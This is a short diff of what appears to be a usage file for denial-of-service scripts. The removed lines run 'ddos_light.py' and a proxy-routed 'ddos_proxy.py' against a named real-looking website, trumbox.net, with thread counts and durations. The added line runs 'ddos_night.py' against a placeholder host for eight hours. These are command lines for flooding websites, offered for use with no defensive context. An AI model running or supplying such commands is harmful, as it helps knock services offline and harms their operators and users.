@@ -1,5 +1,1 @@
-
-python ddos_light.py https://trumbox.net 30 3600 GET
-
-pip install requests PySocks
-python ddos_proxy.py https://trumbox.net/cloud-gaming/play/ 300 500
+python ddos_night.py http://target.com 60 28800
